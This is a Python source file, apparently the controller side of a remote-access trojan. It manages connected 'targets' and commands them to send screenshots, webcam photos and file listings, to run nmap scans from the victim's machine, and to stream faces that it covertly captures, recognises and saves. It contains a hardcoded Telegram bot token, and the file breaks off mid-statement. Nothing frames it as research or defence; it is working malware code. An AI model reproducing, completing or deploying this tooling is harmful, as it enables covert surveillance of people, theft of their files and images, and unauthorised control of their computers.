import socket
import os
import time
import shlex  # Import the shlex module for improved command parsing
import subprocess
import difflib
import platform
import requests
import cv2
import struct
import pickle
import numpy as np
from datetime import datetime
import sys
import json
import base64
import queue
import tkinter as tk
from tkinter import Menu
from tkinter import ttk, simpledialog, messagebox
from PIL import Image, ImageTk
import io
import threading
import tempfile
BOT_TOKEN = "8056372697:AAHabY6CQGqmuf6FObYZH2KaFXAle-RIEVU"
CHAT_ID = "7476876756"
targets = {}  # Dictionary to store target connections and metadata
target_id_counter = 1
current_dir = os.getcwd()
os_name = platform.system()
# Audio streaming variables
black="\033[0;30m"
red="\033[0;31m"
bred="\033[1;31m"
green="\033[0;32m"
bgreen="\033[1;32m"
yellow="\033[0;33m"
byellow="\033[1;33m"
blue="\033[0;34m"
bblue="\033[1;34m"
purple="\033[0;35m"
bpurple="\033[1;35m"
cyan="\033[0;36m"
bcyan="\033[1;36m"
white="\033[0;37m"
nc="\033[00m"
version="1.0"
# Regular Snippets
ask  =     f"{green}[{white}?{green}] {yellow}"
success = f"{yellow}[{white}√{yellow}] {green}"
error  =    f"{blue}[{white}!{blue}] {red}"
info  =   f"{yellow}[{white}+{yellow}] {cyan}"
info2  =   f"{green}[{white}•{green}] {purple}"
i = f"{red}[+]"
# def for slowing write and style
import sys, time
st = 1
# i called it sp for slowPrint
def slow_print(str):
    for letter in str:
        sys.stdout.write(letter)
        sys.stdout.flush()
        time.sleep(st)


def receive_json_response(client_socket):
    """
    Receives a length-prefixed JSON response from the client socket.
    Sets a generous timeout to accommodate long-running Nmap scans.
    """
    original_timeout = client_socket.gettimeout()
    try:
        # Set a generous timeout for receiving Nmap results (e.g., 20 minutes)
        # This should be at least as long as the Nmap execution timeout on the target.
        client_socket.settimeout(2000) # 1200 seconds = 20 minutes

        # Receive the 4-byte length prefix
        raw_length = client_socket.recv(4)
        if not raw_length:
            return None # Connection closed
        if len(raw_length) < 4:
            raise ValueError("Incomplete length prefix received.")

        message_length = struct.unpack("!I", raw_length)[0]

        # Receive the actual JSON data in chunks
        full_data = b""
        bytes_received = 0
        while bytes_received < message_length:
            chunk = client_socket.recv(min(4096, message_length - bytes_received))
            if not chunk:
                # Connection closed prematurely
                raise ConnectionError("Socket connection broken while receiving data.")
            full_data += chunk
            bytes_received += len(chunk)

        response = json.loads(full_data.decode("utf-8"))
        return response

    except socket.timeout:
        print(f"{red}[!] Socket timeout during JSON response reception.{nc}")
        return None
    except ConnectionError as e:
        print(f"{red}[!] Connection error receiving JSON response: {e}{nc}")
        return None
    except json.JSONDecodeError:
        print(f"{red}[!] Failed to decode JSON response. Malformed data received.{nc}")
        return None
    except struct.error:
        print(f"{red}[!] Error unpacking message length. Possible corrupted data.{nc}")
        return None
    except Exception as e:
        print(f"{red}[!] An unexpected error occurred while receiving JSON response: {e}{nc}")
        return None
    finally:
        # Always restore the original timeout
        client_socket.settimeout(original_timeout)












# Add this function to attacker.py
def handle_nmap(target_id, nmap_args):
    """Sends nmap command and arguments to the target and handles results."""
    try:
        target = targets.get(target_id)
        if not target:
            print(f"{red}[!] Invalid Target ID: {target_id}{nc}")
            return

        client_socket = target["socket"]

        print(f"[*] Sending Nmap command to Target ID={target_id} with arguments: {nmap_args}")
        command_to_send = f"nmap_scan {nmap_args}"
        
        # Ensure your send function (e.g., send_command) can handle the command
        # This typically involves length-prefixing the command string.
        # If you don't have a universal send_command, you might need to adapt.
        try:
            client_socket.sendall(command_to_send.encode("utf-8")) # Assuming simple string command for now
        except Exception as e:
            print(f"{red}[!] Failed to send Nmap command to target: {e}{nc}")
            return

        print(f"[*] Waiting for Nmap results from Target ID={target_id}...")
        
        response_data = receive_json_response(client_socket)

        if response_data:
            if response_data.get('status') == 'success':
                print(f"{green}[+] Nmap Scan Results from Target ID={target_id}:\n{response_data.get('output', 'No output.')}{nc}")
                if response_data.get('error'):
                    print(f"{yellow}[*] Nmap reported errors/warnings:\n{response_data['error']}{nc}")
            elif response_data.get('status') == 'timeout':
                print(f"{yellow}[!] Nmap scan timed out on Target ID={target_id}. Reason: {response_data.get('error', 'No specific reason provided.')}{nc}")
            else:
                print(f"{red}[!] Nmap Scan Error from Target ID={target_id}:\n{response_data.get('error', 'Unknown error.')}{nc}")
        else:
            print(f"{red}[!] No valid response or connection closed from target.{nc}")

    except Exception as e:
        print(f"{red}[!] Error handling Nmap command: {e}{nc}")


def handle_search_files(target_id, extension, exclude_system=False, output_file=None):
    try:
        target = targets[target_id]
        client_socket = target["socket"]

        cmd = f"search_files {extension}"
        if exclude_system:
            cmd += " --not-system"

        print(f"{info} Searching for .{extension} files on Target ID={target_id}")
        print(f"{info2} This may take some time...")

        # Send the search command
        client_socket.sendall(cmd.encode("utf-8"))

        client_socket.settimeout(60)  # Long timeout for slow searches

        found_files = []
        buffer = ""
        while True:
            chunk = client_socket.recv(4096).decode("utf-8", errors="ignore")
            if not chunk:
                print(f"{error} Connection lost during file search.")
                break

            buffer += chunk
            if "END_OF_SEARCH" in buffer:
                lines = buffer.splitlines()
                for line in lines:
                    if line.strip() == "END_OF_SEARCH":
                        break
                    print(f"{green}[File]{white} {line.strip()}")
                    found_files.append(line.strip())
                print(f"{success} Search complete.")
                break

        # ✅ Save output if requested
        if output_file and found_files:
            try:
                with open(output_file, "w", encoding="utf-8") as f:
                    for path in found_files:
                        f.write(path + "\n")
                print(f"{success} Results saved to: {output_file}")
            except Exception as e:
                print(f"{error} Could not write to file: {e}")

    except socket.timeout:
        print(f"{error} File search timed out. Try again with a smaller scope.")
    except Exception as e:
        print(f"{error} Error during file search: {e}")
    finally:
        client_socket.settimeout(None)  # Reset timeout



def explore_files_gui(target_id):
    """
    Opens a Tkinter GUI to explore files and directories on the target.
    Simplified: focuses on navigation and displaying full names.
    No automatic file viewing/downloading on double-click.
    """
    target = targets.get(target_id)
    if not target:
        print(f"{error} Invalid Target ID: {target_id}")
        return

    client_socket = target["socket"]
    # Determine initial path based on target OS
    if "Windows" in target["os"]:
        current_remote_path = "C:\\"
    else:
        current_remote_path = "/"

    # Store path history for "step back" functionality
    path_history = [current_remote_path]
    history_index = 0

    def send_command_to_target(cmd):
        """Helper to send command and receive response from target."""
        try:
            client_socket.sendall(cmd.encode("utf-8"))

            # Receive size header
            size_header = client_socket.recv(8)
            if not size_header:
                messagebox.showerror("Error", "Connection lost (no size header).")
                return None

            try:
                expected_size = struct.unpack('!Q', size_header)[0]
            except struct.error:
                messagebox.showerror("Error", "Received malformed size header.")
                return None

            received_data = b""
            while len(received_data) < expected_size:
                chunk = client_socket.recv(min(4096, expected_size - len(received_data)))
                if not chunk:
                    messagebox.showerror("Error", "Connection lost during data transfer.")
                    return None
                received_data += chunk

            response = json.loads(received_data.decode('utf-8'))
            return response
        except Exception as e:
            messagebox.showerror("Communication Error", f"Error communicating with target: {e}")
            return None

    def update_path_history(new_path):
        """Updates the path history for back/forward navigation."""
        nonlocal history_index
        if not path_history or new_path != path_history[history_index]:
            # If we navigated back, clear forward history
            if history_index < len(path_history) - 1:
                path_history[:] = path_history[:history_index + 1]
            path_history.append(new_path)
            history_index = len(path_history) - 1
        
        # Enable/disable back button based on history
        back_button.config(state=tk.NORMAL if history_index > 0 else tk.DISABLED)


    def list_directory(path):
        """Requests directory listing from target and updates GUI."""
        nonlocal current_remote_path
        nonlocal history_index

        
        # Normalize path before sending/storing
        if "Windows" in target["os"]:
            path = path.replace("/", "\\")
            if len(path) == 2 and path[1] == ':': # Handles "C:" -> "C:\"
                path += "\\"
            elif not path.endswith("\\") and len(path) > 3 and path[1] == ':' and path[2] == '\\':
                pass # Already like C:\Folder, no need to add another slash
            elif not path.endswith("\\") and path != "\\": # For non-root directories
                path = os.path.join(path, "") # Add trailing slash if not present
        else: # Linux/Unix
            path = path.replace("\\", "/")
            if not path.endswith("/") and path != "/":
                path = os.path.join(path, "")

        current_remote_path = path # Update current path once normalized
        print(f"[DEBUG_ATTACKER] Requesting dir: {path}") # Debug print

        command = f"list_dir {path}"
        response = send_command_to_target(command)

        if response and response.get('status') == 'success':
            files_and_dirs = response.get('data', [])
            tree.delete(*tree.get_children()) # Clear current view

            # Update path history and button state
            update_path_history(current_remote_path)

            for item in files_and_dirs:
                name = item['name'] # This is the full name (e.g., 'document.txt', 'My Folder')
                item_type = item['type'] # 'dir' or 'file'
                size = item.get('size', '')
                
                # Debugging: print item data before inserting
                print(f"[DEBUG_ATTACKER] Item received: Name='{name}', Type='{item_type}', Size='{size}'")

                # Generate a truly unique ID for the Treeview item (iid)
                # Concatenating path and name ensures uniqueness across different directories
                unique_item_id = os.path.join(current_remote_path, name) 

                if item_type == 'dir':
                    # Use unique_item_id for iid, and 'name' for the displayed text
                    tree.insert("", "end", iid=unique_item_id, text=name, values=["", "Dir"], tags=("dir",))
                else:
                    display_size = f"{size / 1024:.2f} KB" if size else "0 KB"
                    # Use unique_item_id for iid, and 'name' for the displayed text
                    tree.insert("", "end", iid=unique_item_id, text=name, values=[display_size, "File"], tags=("file",))
            
            path_label.config(text=f"Current Path: {current_remote_path}")
        else:
            error_message = response.get('error', 'Unknown error during directory listing.') if response else 'No response from target.'
            messagebox.showerror("Error", f"Failed to list directory: {error_message}\nAttempted path: {path}")
            
            # If listing failed, try to revert to the previous path in history
            if history_index > 0:
                # Revert to the previous path in history without adding current failed path
                path_history.pop() # Remove the failed path
                history_index = len(path_history) - 1 # Go back one
                current_remote_path = path_history[history_index]
                list_directory(current_remote_path) # Retry with the valid previous path
            else:
                # If at root and failed, just update label to show failure
                path_label.config(text=f"Current Path: [ERROR] {current_remote_path}")


    def on_item_double_click(event):
        """Handles double-clicking on items in the treeview."""
        selected_item_id = tree.selection() # This returns a tuple of selected item IDs
        if not selected_item_id:
            return

        # Get the first selected item's ID
        item_id = selected_item_id[0] 
        item_data = tree.item(item_id) # Use the item_id to retrieve its data
        
        item_text = item_data['text'] # This is the displayed text from column #0
        item_type_col = item_data['values'][1] # This is "Dir" or "File" from the Type column

        if item_type_col == "Dir": # Only navigate if it's a directory
            new_path = os.path.join(current_remote_path, item_text)
            # Normalize path separators for Windows targets
            if "Windows" in target["os"]:
                new_path = new_path.replace("/", "\\")
                if not new_path.endswith("\\"):
                    new_path += "\\" # Ensure trailing slash for directories
            else:
                new_path = new_path.replace("\\", "/")
                if not new_path.endswith("/"):
                    new_path += "/"

            list_directory(new_path)
        # Double-clicking files will now do nothing.


    def go_back():
        """Navigates to the previous directory in history."""
        nonlocal history_index, current_remote_path
        if history_index > 0:
            history_index -= 1
            current_remote_path = path_history[history_index]
            list_directory(current_remote_path) # This will update history again but to the same path, which is fine
        back_button.config(state=tk.NORMAL if history_index > 0 else tk.DISABLED)


    # Main Tkinter window setup
    root = tk.Tk()
    root.title(f"File Explorer - Target ID: {target_id} ({target['name'] or target['public_ip']})")
    root.geometry("800x600")
    root.configure(bg="#2E2E2E") # Dark background for the main window

    # Apply a modern theme
    style = ttk.Style()
    style.theme_use("clam") # Or "alt", "default", "classic", "vista", "xpnative"
    
    # Custom styles
    style.configure("TFrame", background="#2E2E2E")
    style.configure("TLabel", background="#2E2E2E", foreground="#FFFFFF", font=("Arial", 10))
    style.configure("TButton", background="#4CAF50", foreground="white", font=("Arial", 10, "bold"), borderwidth=0, focusthickness=3, focuscolor="none")
    style.map("TButton", background=[('active', '#4CAF50')]) # Keep background same on active
    style.configure("Treeview.Heading", font=("Arial", 10, "bold"), background="#3A3A3A", foreground="white")
    style.configure("Treeview", background="#333333", foreground="#FFFFFF", fieldbackground="#333333", rowheight=25, borderwidth=0)
    style.map('Treeview', background=[('selected', '#555555')]) # Change selected item background
    
    style.layout("Treeview", [('Treeview.treearea', {'sticky': 'nswe'})]) # Remove default border

    # Top frame for path and buttons
    top_frame = ttk.Frame(root, style="TFrame")
    top_frame.pack(fill="x", padx=10, pady=5)

    path_label = ttk.Label(top_frame, text=f"Current Path: {current_remote_path}", font=("Arial", 10, "bold"), style="TLabel")
    path_label.pack(side="left", fill="x", expand=True)

    back_button = ttk.Button(top_frame, text="Step Back", command=go_back, style="TButton")
    back_button.pack(side="right", padx=5)
    back_button.config(state=tk.DISABLED) # Initially disabled if at root

    # Treeview for file/directory listing
    tree_frame = ttk.Frame(root, style="TFrame")
    tree_frame.pack(expand=True, fill="both", padx=10, pady=5)

    tree = ttk.Treeview(tree_frame, columns=("Size", "Type"), show="tree headings", style="Treeview")
    tree.heading("#0", text="Name", anchor="w") # #0 is the primary "tree" column
    tree.heading("Size", text="Size", anchor="e")
    tree.heading("Type", text="Type", anchor="center")

    tree.column("#0", width=400, anchor="w", stretch=tk.YES)
    tree.column("Size", width=100, anchor="e")
    tree.column("Type", width=80, anchor="center")

    # Scrollbars
    vsb = ttk.Scrollbar(tree_frame, orient="vertical", command=tree.yview)
    hsb = ttk.Scrollbar(tree_frame, orient="horizontal", command=tree.xview)
    tree.configure(yscrollcommand=vsb.set, xscrollcommand=hsb.set)

    tree.grid(row=0, column=0, sticky="nsew")
    vsb.grid(row=0, column=1, sticky="ns")
    hsb.grid(row=1, column=0, sticky="ew")

    tree_frame.grid_rowconfigure(0, weight=1)
    tree_frame.grid_columnconfigure(0, weight=1)

    tree.bind("<Double-1>", on_item_double_click)
    def on_right_click(event):
        # Identify the item under the cursor
        selected_item = tree.identify_row(event.y)
        if selected_item:
            tree.selection_set(selected_item)
            context_menu.post(event.x_root, event.y_root)

    def copy_selected_path():
        selected_item = tree.selection()
        if selected_item:
            item_id = selected_item[0]  # This is the iid, which is the full path
            fixed_path = item_id.replace("/", "\\") if "Windows" in target["os"] else item_id
            root.clipboard_clear()
            root.clipboard_append(fixed_path)
            root.update()
            messagebox.showinfo("Copied", f"Path copied to clipboard:\n{fixed_path}")


    # Create the context menu
    context_menu = Menu(root, tearoff=0)
    context_menu.add_command(label="Copy Full Path", command=copy_selected_path)

    # Bind right-click event (Windows uses <Button-3>)
    tree.bind("<Button-3>", on_right_click)


    # Initial directory listing
    list_directory(current_remote_path)

    root.mainloop()






def ask_deepai(question: str) -> str:
    """
    Sends a question to the DeepAI API and returns the AI's response.
    Uses multipart/form-data as per the provided example.
    """
    api_url = "https://api.deepai.org/hacking_is_a_serious_crime" # The specific endpoint you provided
    
    # --- IMPORTANT: PLACE YOUR DEEPAI API KEY HERE ---
    # 1. Go to deepai.org
    # 2. Sign up/Log in.
    # 3. Find your API Key in your account dashboard.
    # 4. Replace 'YOUR_DEEPAI_API_KEY_HERE' with your actual key.
    #    If you don't have one, the requests will likely fail.
    headers = {
        'api-key': 'YOUR_DEEPAI_API_KEY_HERE' # <--- ADD YOUR ACTUAL API KEY HERE
    }
    # --- END IMPORTANT ---
    
    chat_history = json.dumps([{"role": "user", "content": question}])

    payload = {
        'chat_style': 'chat',
        'chatHistory': chat_history,
        'model': 'standard',
        'hacker_is_stinky': 'very_stinky'
    }

    try:
        
        response = requests.post(api_url, data=payload, headers=headers)
    

        response.raise_for_status() # Raise an exception for HTTP errors (4xx or 5xx)

        return response.text.strip() # .strip() removes leading/trailing whitespace/newlines

    except requests.exceptions.HTTPError as http_err:
        return f"Error: AI API returned HTTP {response.status_code}. Response: {response.text.strip()[:100]}..."
    except requests.exceptions.RequestException as e:
        return f"Error: Could not connect to AI API ({e})"
    except Exception as e:
        return "Error: An unexpected error occurred."

def handle_popup_image(target_id, image_path):
    """Sends an image to the target to be displayed in a popup."""
    if not os.path.exists(image_path):
        print(f"{error} File not found: {image_path}")
        return
        
    try:
        target = targets[target_id]
        client_socket = target["socket"]
        
        print(f"{info} Sending image popup request for '{image_path}' to Target ID={target_id}")
        
        # 1. Send the command
        client_socket.sendall("popup_image".encode("utf-8"))
        
        # 2. Read image data and get its size
        with open(image_path, "rb") as f:
            image_data = f.read()
        
        # 3. Send the size header (16 bytes)
        client_socket.sendall(f"{len(image_data):016d}".encode("utf-8"))
        
        # 4. Send the image data itself
        client_socket.sendall(image_data)
        
        # 5. Wait for confirmation from the target
        response = client_socket.recv(1024).decode("utf-8")
        print(f"{success} [Response from Target-{target_id}]: {response}")

    except KeyError:
        print(f"{error} Invalid Target ID")
    except Exception as e:
        print(f"{error} Error sending image popup command: {e}")





def handle_popup(target_id, title, message):
    """Sends a command to the target to display a popup message."""
    try:
        target = targets[target_id]
        client_socket = target["socket"]
        
        # Format the command carefully with quotes
        popup_command = f'popup "{title}" "{message}"'
        
        print(f"[*] Sending popup request to Target ID={target_id}")
        client_socket.sendall(popup_command.encode("utf-8"))
        
        # Wait for a confirmation response from the target
        response = client_socket.recv(1024).decode("utf-8")
        print(f"[Response from Target-{target_id}]: {response}")

    except KeyError:
        print("[!] Invalid Target ID")
    except Exception as e:
        print(f"[!] Error sending popup command: {e}")


def handle_face_recon(target_id, camera_index):
    """Handle the face recognition process using LBPH Face Recognizer."""
    client_socket = None # Initialize client_socket to None

    # --- Display Window Constants (for a more designed look) ---
    WINDOW_WIDTH = 640
    WINDOW_HEIGHT = 540 # Increased height for status panel
    FACE_DISPLAY_HEIGHT = 420 # Height reserved for the face image
    STATUS_PANEL_HEIGHT = WINDOW_HEIGHT - FACE_DISPLAY_HEIGHT # Height for status text at the bottom

    # --- Variable to persist the last displayed face image ---
    last_displayed_face_image = None # Stores the last successfully processed and annotated face image

    try:
        target = targets[target_id]
        client_socket = target["socket"]
        
        # --- Face Recognizer Setup ---
        recognizer = cv2.face.LBPHFaceRecognizer_create(radius=1, neighbors=8, grid_x=8, grid_y=8)
        
        save_folder = "captured_faces"
        os.makedirs(save_folder, exist_ok=True)
        print(f"[*] Saving unique faces in '{save_folder}/'")
        print("[!] pls after stopping the command wait for 10 sec to clean the socket.")

        known_face_images = []
        known_face_labels = []
        label_id_counter = 0

        # Load and "train" the recognizer on already known faces from the folder
        for filename in sorted(os.listdir(save_folder)):
            if filename.lower().endswith((".jpg", ".png")):
                path = os.path.join(save_folder, filename)
                face_image = cv2.imread(path, cv2.IMREAD_GRAYSCALE)
                if face_image is not None:
                    known_face_images.append(face_image)
                    known_face_labels.append(label_id_counter)
                    label_id_counter += 1
        
        if known_face_images:
            print(f"[*] Loaded {len(known_face_images)} known faces. Training recognizer...")
            recognizer.train(known_face_images, np.array(known_face_labels))
            print("[+] Recognizer trained.")
        else:
            print("[*] No known faces found. Ready to capture new ones.")

        # Command the target to start sending faces
        client_socket.sendall(f"face_recon {camera_index}".encode("utf-8"))

        # Create the main display window
        cv2.namedWindow(f"Face Recon - Target {target_id}", cv2.WINDOW_NORMAL)
        cv2.resizeWindow(f"Face Recon - Target {target_id}", WINDOW_WIDTH, WINDOW_HEIGHT)

        while True:
            # Always prepare the combined display base
            combined_display = np.zeros((WINDOW_HEIGHT, WINDOW_WIDTH, 3), dtype=np.uint8)

            new_face_color = None # Reset for current iteration
            current_face_processed_for_display = None # Will hold the annotated face if a new one is received

            try:
                # Receive size of the incoming face image
                size_prefix = client_socket.recv(4)
                if not size_prefix: break # Connection closed
                frame_size = struct.unpack("<L", size_prefix)[0]

                # Receive the full face image data
                client_socket.settimeout(5) # Give more time for the full frame
                received_bytes = 0
                frame_data = b""
                while received_bytes < frame_size:
                    chunk = client_socket.recv(frame_size - received_bytes)
                    if not chunk: break # Connection closed
                    frame_data += chunk
                    received_bytes += len(chunk)
                client_socket.settimeout(0.1) # Reset to short timeout for next loop iteration
                
                if received_bytes < frame_size: 
                    # If we didn't receive the full frame, skip processing this one as a new frame
                    print("[!] Incomplete frame received.")
                    continue # Skip to next iteration, will display last_displayed_face_image
                
                # Decode the color image
                np_array = np.frombuffer(frame_data, np.uint8)
                new_face_color = cv2.imdecode(np_array, cv2.IMREAD_COLOR)

                if new_face_color is not None:
                    # --- Process and annotate this new_face_color if successfully decoded ---

                    # Resize the received face to fit in the display area, maintaining aspect ratio
                    face_h, face_w = new_face_color.shape[:2]
                    aspect_ratio = face_w / face_h
                    
                    display_face_w = int(FACE_DISPLAY_HEIGHT * aspect_ratio)
                    display_face_h = FACE_DISPLAY_HEIGHT

                    # If the resized width exceeds window width, adjust height accordingly
                    if display_face_w > WINDOW_WIDTH:
                        display_face_w = WINDOW_WIDTH
                        display_face_h = int(WINDOW_WIDTH / aspect_ratio)

                    resized_face = cv2.resize(new_face_color, (display_face_w, display_face_h))

                    # Create a temporary copy for text overlay
                    face_with_overlay_temp = resized_face.copy()
                    
                    # Convert to grayscale for recognition
                    new_face_gray = cv2.cvtColor(new_face_color, cv2.COLOR_BGR2GRAY)

                    is_new_face = False
                    recognition_label_display = "N/A"
                    recognition_confidence_display = 0.0
                    
                    if not known_face_images:
                        is_new_face = True
                        print(f"[*] No known faces yet. Treating current face as new.")
                    else:
                        label, confidence = recognizer.predict(new_face_gray)
                        recognition_label_display = label
                        recognition_confidence_display = confidence
                        
                        confidence_threshold = 65 
                        if confidence > confidence_threshold:
                            is_new_face = True
                            print(f"[*] Unrecognized face detected (Confidence: {confidence:.2f} > {confidence_threshold}). Treating as new.")
                        else:
                            print(f"[*] Known face detected: Face ID {label} (Confidence: {confidence:.2f})")
                            
                    if is_new_face:
                        new_label = label_id_counter
                        print(f"[+] New unique face detected! Saving and training as Face ID: {new_label}")
                        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
                        save_path = os.path.join(save_folder, f"face_{new_label}_{timestamp}.jpg")
                        cv2.imwrite(save_path, new_face_color)
                        print(f"[+] Saved new face to: {save_path}")

                        known_face_images.append(new_face_gray)
                        known_face_labels.append(new_label)
                        
                        if len(known_face_images) == 1:
                            recognizer.train(known_face_images, np.array(known_face_labels))
                            print("[+] Initial recognizer training complete.")
                        else:
                            recognizer.update([new_face_gray], np.array([new_label]))
                            print("[+] Recognizer updated with new face.")
                        
                        label_id_counter += 1
                        recognition_label_display = new_label # Update for display immediately
                        recognition_confidence_display = 0.0 # New face, confidence might not be meaningful immediately

                    # --- Overlay text on the face image itself (on the temporary copy) ---
                    text_on_face = ""
                    text_on_face_color = (255, 255, 255) # Default white
                    
                    if is_new_face:
                        text_on_face = f"NEW FACE! ID: {recognition_label_display}"
                        text_on_face_color = (0, 255, 255) # Yellow for new
                    else:
                        text_on_face = f"Known ID: {recognition_label_display} (Conf: {recognition_confidence_display:.2f})"
                        if recognition_confidence_display <= confidence_threshold:
                            text_on_face_color = (0, 255, 0) # Green for strong match
                        else:
                            text_on_face_color = (0, 165, 255) # Orange for weaker match (still recognized)
                            
                    font = cv2.FONT_HERSHEY_SIMPLEX
                    font_scale = 0.6
                    font_thickness = 2
                    
                    # Draw a semi-transparent background for the text on the face
                    (text_w, text_h), baseline = cv2.getTextSize(text_on_face, font, font_scale, font_thickness)
                    rect_start = (5, face_with_overlay_temp.shape[0] - text_h - 10) # Position on face image itself
                    rect_end = (rect_start[0] + text_w + 10, face_with_overlay_temp.shape[0] - 5)
                    
                    cv2.rectangle(face_with_overlay_temp, rect_start, rect_end, (0, 0, 0), -1) 
                    
                    cv2.putText(face_with_overlay_temp, text_on_face, (rect_start[0] + 5, rect_end[1] - 5),
                                font, font_scale, text_on_face_color, font_thickness, cv2.LINE_AA)
                    
                    # This is the new processed face image to display
                    current_face_processed_for_display = face_with_overlay_temp

            except socket.timeout:
                # Expected timeout, no new frame received this iteration.
                # current_face_processed_for_display remains None,
                # so last_displayed_face_image will be used.
                pass 
            except Exception as e:
                # Handle errors during frame reception or decoding
                print(f"[!] Error during face reception/recognition: {e}")
                # current_face_processed_for_display remains None,
                # so last_displayed_face_image will be used.
                
                # Display an error message on the screen too
                cv2.putText(combined_display, f"Error: {e}", 
                            (WINDOW_WIDTH // 2 - 150, FACE_DISPLAY_HEIGHT // 2 + 50),
                            cv2.FONT_HERSHEY_SIMPLEX, 0.6, (0, 0, 255), 2)

            # --- Determine which face image to display ---
            if current_face_processed_for_display is not None:
                # A new, valid frame was successfully processed this iteration, use it
                last_displayed_face_image = current_face_processed_for_display
            
            if last_displayed_face_image is not None:
                # Calculate position to paste the last displayed face (center horizontally, top aligned)
                start_x_face = (WINDOW_WIDTH - last_displayed_face_image.shape[1]) // 2
                combined_display[0:last_displayed_face_image.shape[0], start_x_face:start_x_face+last_displayed_face_image.shape[1]] = last_displayed_face_image
            else:
                # If no face has ever been displayed, show a "Waiting" message
                cv2.putText(combined_display, "Waiting for first face...", 
                            (WINDOW_WIDTH // 2 - 120, FACE_DISPLAY_HEIGHT // 2),
                            cv2.FONT_HERSHEY_SIMPLEX, 0.8, (100, 100, 100), 2)
            
            # --- Add general status text to the bottom panel (always shown) ---
            status_panel_y_start = FACE_DISPLAY_HEIGHT # Where the status panel begins
            
            # Draw a separating line for better design
            cv2.line(combined_display, (0, status_panel_y_start), (WINDOW_WIDTH, status_panel_y_start), (50, 50, 50), 2)

            cv2.putText(combined_display, f"Watching Target {target_id}", (20, status_panel_y_start + 30), 
                        cv2.FONT_HERSHEY_SIMPLEX, 0.7, (255, 255, 255), 2)
            
            cv2.putText(combined_display, f"Unique faces remembered: {len(known_face_images)}", (20, status_panel_y_start + 60), 
                        cv2.FONT_HERSHEY_SIMPLEX, 0.7, (0, 255, 0), 2)
            
            cv2.putText(combined_display, "Press 'q' in this window to stop", (20, WINDOW_HEIGHT - 20), 
                        cv2.FONT_HERSHEY_SIMPLEX, 0.5, (0, 0, 255), 1)
            
            # Display the combined window
            cv2.imshow(f"Face Recon - Target {target_id}", combined_display)
            
            if cv2.waitKey(1) & 0xFF == ord('q'):
                print("[*] 'q' pressed. Stopping face recognition.")
                try: client_socket.sendall(b"stop_recon")
                except Exception as e: print(f"[!] Could not send stop signal: {e}")
                break
        
    except KeyError:
        print("[!] Invalid Target ID")
    except Exception as e:
        print(f"[!] Error: {e}")
    finally:
        cv2.destroyAllWindows()
        # --- Clear any remaining data from the socket buffer ---
        if client_socket:
            print("[*] Clearing remaining socket buffer data...")
            client_socket.setblocking(False) # Set to non-blocking
            try:
                while True:
                    data = client_socket.recv(4096) # Read up to 4KB at a time
                    if not data:
                        break # No more data
            except BlockingIOError:
                pass # No more data to read, or buffer is empty
            except Exception as e:
                print(f"[!] Error while clearing socket buffer: {e}")
            finally:
                client_socket.setblocking(True) # Restore to blocking mode for next command
                print("[*] Socket buffer cleared.")






def handle_screenshot(target_id, save_path):
    """Receive screenshot from target and save it."""
    try:
        target = targets[target_id]
        client_socket = target["socket"]
        
        print(f"[*] Requesting screenshot from Target ID={target_id}")
        client_socket.sendall("screenshot".encode("utf-8"))

        # Receive file size (16 bytes)
        size_data = client_socket.recv(16)
        if not size_data:
            raise ConnectionError("No size header received for screenshot.")
        
        try:
            file_size = int(size_data.decode("utf-8").strip())
        except ValueError:
            error_msg = size_data + client_socket.recv(4096)
            print(f"[!] Target error: {error_msg.decode('utf-8', errors='ignore')}")
            return
            
        # Receive image data
        received = 0
        image_data = b""
        while received < file_size:
            remaining = file_size - received
            chunk = client_socket.recv(min(4096, remaining))
            if not chunk:
                raise ConnectionError("Connection lost during screenshot transfer.")
            image_data += chunk
            received += len(chunk)
            print(f"\r[+] Received: {received/1024:.1f}KB/{file_size/1024:.1f}KB ({received/file_size:.1%})", end="")

        with open(save_path, "wb") as f:
            f.write(image_data)
        print(f"\n[+] Screenshot saved to {save_path}")

    except KeyError:
        print("[!] Invalid Target ID")
    except Exception as e:
        print(f"\n[!] Error handling screenshot: {e}")

def handle_webcam_snap(target_id, camera_index, save_path):
    """Receive webcam photo from target and save it."""
    try:
        target = targets[target_id]
        client_socket = target["socket"]
        
        print(f"[*] Requesting webcam snap from Target ID={target_id}, Camera Index={camera_index}")
        client_socket.sendall(f"webcam_snap {camera_index}".encode("utf-8"))

        # Receive file size (16 bytes)
        size_data = client_socket.recv(16)
        if not size_data:
            raise ConnectionError("No size header received for webcam photo.")
            
        try:
            file_size = int(size_data.decode("utf-8").strip())
        except ValueError:
            error_msg = size_data + client_socket.recv(4096)
            print(f"[!] Target error: {error_msg.decode('utf-8', errors='ignore')}")
            return
            
        # Receive image data
        received = 0
        image_data = b""
        while received < file_size:
            remaining = file_size - received
            chunk = client_socket.recv(min(4096, remaining))
            if not chunk:
                raise ConnectionError("Connection lost during webcam photo transfer.")
            image_data += chunk
            received += len(chunk)
            print(f"\r[+] Received: {received/1024:.1f}KB/{file_size/1024:.1f}KB ({received/file_size:.1%})", end="")

        with open(save_path, "wb") as f:
            f.write(image_data)
        print(f"\n[+] Webcam photo saved to {save_path}")

    except KeyError:
        print("[!] Invalid Target ID")
    except Exception as e:
        print(f"\n[!] Error handling webcam snap: {e}")


def reset_socket_connection(target_id):
    """Reset the socket connection after binary operations"""
    try:
        target = targets[target_id]
        old_socket = target["socket"]
        
        # Create new connection
        new_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        new_socket.connect(target["address"])
        
        # Re-authenticate
        os_info = target["os"]
        public_ip = target["public_ip"]
        name = target["name"]
        new_socket.sendall(f"{os_info}|{public_ip}|{name}\n".encode("utf-8"))
        
        # Replace the socket
        target["socket"] = new_socket
        old_socket.close()
        return True
        
    except Exception as e:
        print(f"[!] Error resetting connection: {e}")
        return False





def handle_list_cameras(target_id):
    try:
        target = targets[target_id]
        client_socket = target["socket"]
        print(f"[*] Requesting camera list from Target ID={target_id}")
        client_socket.sendall("list_cameras".encode("utf-8"))
        client_socket.settimeout(10)

        data = client_socket.recv(1024).decode("utf-8")
        if data.startswith("CAMERA_LIST:"):
            cam_list = data.replace("CAMERA_LIST:", "")
            if cam_list == "None":
                print("[!] No cameras found on target.")
            else:
                print(f"[+] Available cameras: {cam_list}")
        elif data.startswith("CAMERA_LIST_ERROR:"):
            print(f"[!] Camera listing failed: {data.replace('CAMERA_LIST_ERROR:', '')}")
        else:
            print(f"[!] Unexpected response: {data}")

    except socket.timeout:
        print("[!] Error listing cameras: timed out")
    except Exception as e:
        print(f"[!] Error listing cameras: {e}")



if os.name == "nt":  # Windows
